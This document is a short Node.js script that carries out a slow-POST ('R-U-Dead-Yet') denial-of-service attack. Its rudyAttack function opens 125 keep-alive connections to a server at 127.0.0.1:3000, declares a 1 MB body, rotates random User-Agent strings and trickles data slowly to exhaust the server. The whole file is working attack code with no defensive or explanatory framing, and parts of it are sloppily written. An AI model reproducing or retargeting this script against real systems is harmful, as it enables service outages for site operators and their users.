const request = require('request')
const useragent = require('random-useragent')
const rp = require('request-promise')
const fs = require('fs')

let stream = fs.createReadStream('payload.txt')

const host = 'http://127.0.0.1:3000'
const connections = 125

function setupStream() {
  stream._read = () => {
    setTimeout(() => {
      stream.push('payload.txt')
    }, Math.random() * 10 + 1)
  }
}

const options = {
  method: 'POST',
  uri: host,
  headers: {
    'Connection': 'keep-alive',
    'Content-Length': '1048576',
    'User-Agent': useragent.getRandom()
  },
  formData: {
    file: stream
  }
}

rudyAttack()

function rudyAttack() {
  for(let i = 0; i < connections; i++) {
    setupStream()
    attack()
  }
}

function attack() {
  rp(options)
  .then(() => {
    console.log('Request initiated')
    closeStream()
  })
  .catch(err => {
    console.error('An error occured while sending request')
    closeStream()
  })
}

function closeStream() {
  stream.close()
}

